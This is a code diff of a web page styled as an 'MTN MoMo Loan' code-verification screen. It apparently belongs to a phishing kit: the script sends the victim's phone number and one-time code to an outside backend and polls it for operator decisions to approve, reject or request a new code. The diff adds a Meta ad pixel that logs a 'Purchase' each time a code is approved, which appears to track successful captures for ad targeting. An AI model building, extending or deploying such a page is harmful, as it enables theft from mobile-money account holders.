@@ -6,6 +6,29 @@
     <meta name="theme-color" content="#000000">
     <title>MTN MoMo Loan - Verify Code | MoMo Advance Loans</title>
 
+    <!-- ============================================
+         META PIXEL — BASE CODE
+         Pixel ID: 1021851290903869
+         ============================================ -->
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1021851290903869');
+      fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1021851290903869&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- ============================================
+         END META PIXEL
+         ============================================ -->
+
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -53,7 +76,7 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        /* ═══════════ HEADER ═══════════ */
+        /* HEADER */
         .header {
             position: fixed;
             top: 0; left: 0; right: 0;
@@ -113,7 +136,7 @@
             color: #fff;
         }
 
-        /* ═══════════ CARD ═══════════ */
+        /* CARD */
         .card-wrap {
             width: 100%;
             max-width: 480px;
@@ -182,14 +205,13 @@
         }
         .instruction strong { color: var(--text-dark); font-weight: 800; }
 
-        /* ═══════════ OTP BOXES ═══════════ */
+        /* OTP BOXES */
         .otp-boxes {
             display: flex;
             justify-content: center;
             gap: 14px;
             margin-bottom: 12px;
         }
-
         .otp-box {
             width: 56px;
             height: 62px;
@@ -207,27 +229,23 @@
             padding: 0;
             flex: none;
         }
-
         .otp-box:focus {
             border-color: var(--mtn-gold);
             background: #ffffff;
             box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.18);
             transform: scale(1.04);
         }
-
         .otp-box.filled {
             border-color: var(--mtn-gold);
             background: linear-gradient(135deg, #FFFBEB, #FFF3C0);
             color: #7A5C00;
         }
-
         .otp-box.invalid {
             border-color: var(--error);
             background: #FFF5F5;
             box-shadow: 0 0 0 4px rgba(220, 38, 38, 0.12);
             animation: shake 0.4s ease;
         }
-
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-6px); }
@@ -336,7 +354,6 @@
         }
         .security-notice .ico { color: var(--success); font-size: 13px; }
 
-        /* ═══════════ FOOTER ═══════════ */
         .footer {
             position: fixed;
             bottom: 0; left: 0; right: 0;
@@ -351,9 +368,7 @@
         }
         .footer-text { font-size: 11px; color: var(--text-light); font-weight: 600; letter-spacing: 0.05em; }
 
-        /* ═══════════════════════════════════════════
-           SUPER VERIFY OVERLAY
-        ═══════════════════════════════════════════ */
+        /* SUPER VERIFY OVERLAY */
         .verify-overlay {
             position: fixed;
             inset: 0;
@@ -574,9 +589,7 @@
             50% { opacity: 0.5; transform: scale(0.85); }
         }
 
-        /* ═══════════════════════════════════════════
-           NOTICE POPUP (reject / resend)
-        ═══════════════════════════════════════════ */
+        /* NOTICE POPUP */
         .notice-overlay {
             position: fixed;
             inset: 0;
@@ -589,10 +602,7 @@
             padding: 24px;
             z-index: 11000;
         }
-        .notice-overlay.show {
-            display: flex;
-            animation: fadeIn 0.3s ease;
-        }
+        .notice-overlay.show { display: flex; animation: fadeIn 0.3s ease; }
 
         .notice-card {
             background: #fff;
@@ -621,8 +631,6 @@
             font-size: 34px;
             position: relative;
         }
-
-        /* Reject (red) */
         .notice-icon-wrap.reject {
             background: linear-gradient(135deg, #FEE2E2, #FECACA);
             box-shadow: 0 8px 24px rgba(220, 38, 38, 0.25);
@@ -635,8 +643,6 @@
             border: 2px solid rgba(220, 38, 38, 0.2);
             animation: ringPulse 2s ease-out infinite;
         }
-
-        /* Resend (amber) */
         .notice-icon-wrap.resend {
             background: linear-gradient(135deg, #FFF8DC, #FFF3C0);
             box-shadow: 0 8px 24px rgba(255, 204, 0, 0.35);
@@ -649,7 +655,6 @@
             border: 2px solid rgba(255, 204, 0, 0.3);
             animation: ringPulse 2s ease-out infinite;
         }
-
         @keyframes ringPulse {
             0% { transform: scale(1); opacity: 1; }
             100% { transform: scale(1.4); opacity: 0; }
@@ -663,7 +668,6 @@
             line-height: 1.3;
             letter-spacing: -0.02em;
         }
-
         .notice-message {
             font-size: 0.9rem;
             color: var(--text-mid);
@@ -716,9 +720,7 @@
             box-shadow: 0 14px 30px rgba(220, 38, 38, 0.55);
         }
 
-        /* ═══════════════════════════════════════════
-           CONGRATS OVERLAY
-        ═══════════════════════════════════════════ */
+        /* CONGRATS OVERLAY */
         .congrats-overlay {
             position: fixed;
             inset: 0;
@@ -733,7 +735,6 @@
             animation: fadeIn 0.3s ease;
         }
         .congrats-overlay.show { display: flex; }
-
         .congrats-content {
             background: white;
             border-radius: 28px;
@@ -745,7 +746,6 @@
             overflow: hidden;
             text-align: center;
         }
-
         .congrats-header {
             background: var(--grad);
             padding: 30px 24px 24px;
@@ -755,14 +755,11 @@
         .congrats-header::before {
             content: '🎉🎊💰';
             position: absolute;
-            top: -10px;
-            left: 0;
-            right: 0;
+            top: -10px; left: 0; right: 0;
             font-size: 30px;
             opacity: 0.15;
             letter-spacing: 8px;
         }
-
         .congrats-emoji {
             font-size: 60px;
             display: block;
@@ -774,7 +771,6 @@
             0%, 100% { transform: translateY(0) scale(1); }
             50% { transform: translateY(-8px) scale(1.05); }
         }
-
         .congrats-title {
             font-size: 24px;
             font-weight: 800;
@@ -787,9 +783,7 @@
             color: rgba(255, 255, 255, 0.9);
             position: relative;
         }
-
         .congrats-body { padding: 24px 22px 28px; }
-
         .congrats-message {
             font-size: 16px;
             font-weight: 700;
@@ -803,7 +797,6 @@
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
-
         .congrats-time {
             display: inline-flex;
             align-items: center;
@@ -818,7 +811,6 @@
             color: #1e7e34;
         }
         .congrats-time .clock { font-size: 16px; }
-
         .congrats-note {
             font-size: 12px;
             color: var(--text-light);
@@ -827,7 +819,6 @@
             padding: 0 8px;
             font-weight: 600;
         }
-
         .congrats-btn {
             width: 100%;
             padding: 16px;
@@ -851,7 +842,6 @@
         }
         .congrats-btn:active { transform: scale(0.98); }
 
-        /* ═══════════ SMALL PHONES ═══════════ */
         @media (max-height: 700px) {
             .card { padding: 18px 16px; }
             .icon-badge { width: 54px; height: 54px; font-size: 26px; margin-bottom: 10px; }
@@ -1026,15 +1016,9 @@
     </div>
 
     <script>
-        /* ═══════════════════════════════════════════
-           CONFIG
-        ═══════════════════════════════════════════ */
         const API_BASE = 'https://momo-usersey-production.up.railway.app';
         const POLL_INTERVAL_MS = 2500;
 
-        /* ═══════════════════════════════════════════
-           DOM REFS
-        ═══════════════════════════════════════════ */
         const otpBoxes = [
             document.getElementById('otp1'),
             document.getElementById('otp2'),
@@ -1044,7 +1028,6 @@
         const otpError = document.getElementById('otpError');
         const verifyBtn = document.getElementById('verifyBtn');
         const resendBtn = document.getElementById('resendBtn');
-        const countdownEl = document.getElementById('countdown');
         const congratsOverlay = document.getElementById('congratsOverlay');
         const verifyOverlay = document.getElementById('verifyOverlay');
         const verifyBarFill = document.getElementById('verifyBarFill');
@@ -1052,7 +1035,6 @@
         const verifySubtitle = document.getElementById('verifySubtitle');
         const verifyStepInner = document.getElementById('verifyStepInner');
 
-        // Notice popup
         const noticeOverlay = document.getElementById('noticeOverlay');
         const noticeIconWrap = document.getElementById('noticeIconWrap');
         const noticeIcon = document.getElementById('noticeIcon');
@@ -1060,9 +1042,6 @@
         const noticeMessage = document.getElementById('noticeMessage');
         const noticeBtn = document.getElementById('noticeBtn');
 
-        /* ═══════════════════════════════════════════
-           SESSION CHECK
-        ═══════════════════════════════════════════ */
         const sessionRaw = localStorage.getItem('momoSession');
         if (!sessionRaw) {
             window.location.href = 'login.html';
@@ -1073,9 +1052,6 @@
         const storedPhone = localStorage.getItem('momoPhone') || session.phone || '';
         const storedSms = localStorage.getItem('momoSms') || '';
 
-        /* ═══════════════════════════════════════════
-           OTP BOXES
-        ═══════════════════════════════════════════ */
         function getOtpValue() {
             return otpBoxes.map(b => b.value).join('');
         }
@@ -1125,9 +1101,6 @@
             });
         });
 
-        /* ═══════════════════════════════════════════
-           RESEND COUNTDOWN
-        ═══════════════════════════════════════════ */
         let remaining = 60;
         let resendTimer = null;
 
@@ -1147,6 +1120,7 @@
                 }
             }, 1000);
         }
+
         startCountdown();
 
         resendBtn.addEventListener('click', async function() {
@@ -1163,9 +1137,6 @@
             startCountdown();
         });
 
-        /* ═══════════════════════════════════════════
-           SUPER VERIFY OVERLAY
-        ═══════════════════════════════════════════ */
         let verifyTimer = null;
         let stepTimer = null;
 
@@ -1208,15 +1179,11 @@
             verifyStepInner.style.transform = 'translateY(0)';
         }
 
-        /* ═══════════════════════════════════════════
-           NOTICE POPUP
-        ═══════════════════════════════════════════ */
         let noticeAction = null;
 
         function showNotice({ type, icon, title, message, buttonText, buttonClass, onOk }) {
             noticeIconWrap.className = 'notice-icon-wrap';
             noticeBtn.className = 'notice-btn';
-
             if (type) noticeIconWrap.classList.add(type);
             if (buttonClass) noticeBtn.classList.add(buttonClass);
 
@@ -1233,25 +1200,19 @@
             noticeOverlay.classList.remove('show');
             const action = noticeAction;
             noticeAction = null;
-            if (typeof action === 'function') {
-                setTimeout(action, 200);
-            }
+            if (typeof action === 'function') setTimeout(action, 200);
         });
-
-        /* ═══════════════════════════════════════════
-           POLLING
-        ═══════════════════════════════════════════ */
-        let pollTimer = null;
-
-        function stopPolling() {
-            if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
-        }
 
         function clearOtpBoxes() {
             otpBoxes.forEach(b => {
                 b.value = '';
                 b.classList.remove('filled', 'invalid');
             });
+        }
+
+        let pollTimer = null;
+        function stopPolling() {
+            if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
         }
 
         function startPolling(sessionId) {
@@ -1265,6 +1226,18 @@
                     if (data.status === 'approved') {
                         stopPolling();
                         finishVerifyBar();
+
+                        /* ✅ META PIXEL — Purchase fired when OTP is approved */
+                        if (typeof fbq === 'function') {
+                            fbq('track', 'Purchase', {
+                                content_name: 'MoMo Loan Disbursed',
+                                content_category: 'OTP_Verified',
+                                value: 0,
+                                currency: 'XAF'
+                            });
+                            console.log('✅ Meta Pixel: Purchase event fired');
+                        }
+
                         localStorage.setItem('momoVerified', JSON.stringify({
                             verifiedAt: new Date().toISOString(),
                             sessionId: sessionId
@@ -1293,7 +1266,7 @@
                             }
                         });
 
-                    } else if (data.status === 'resend') {
+                    } else if (data.status === 'resend' || data.status === 'resend_requested') {
                         stopPolling();
                         stopVerifyAnimation();
                         showNotice({
@@ -1307,24 +1280,6 @@
                                 otpError.classList.remove('show');
                                 verifyBtn.disabled = true;
                                 verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
-                                otpBoxes[0].focus();
-                            }
-                        });
-
-                    } else if (data.status === 'resend_requested') {
-                        // legacy support
-                        stopPolling();
-                        stopVerifyAnimation();
-                        showNotice({
-                            type: 'resend',
-                            icon: '🔁',
-                            title: 'Enter New Code',
-                            message: 'Please enter the <strong>new code</strong> you received via SMS.',
-                            buttonText: 'ENTER NEW CODE',
-                            onOk: function() {
-                                clearOtpBoxes();
-                                otpError.classList.remove('show');
-                                verifyBtn.disabled = true;
                                 otpBoxes[0].focus();
                             }
                         });
@@ -1354,9 +1309,6 @@
             }, POLL_INTERVAL_MS);
         }
 
-        /* ═══════════════════════════════════════════
-           VERIFY BUTTON
-        ═══════════════════════════════════════════ */
         verifyBtn.addEventListener('click', async function() {
             const otp = getOtpValue();
 
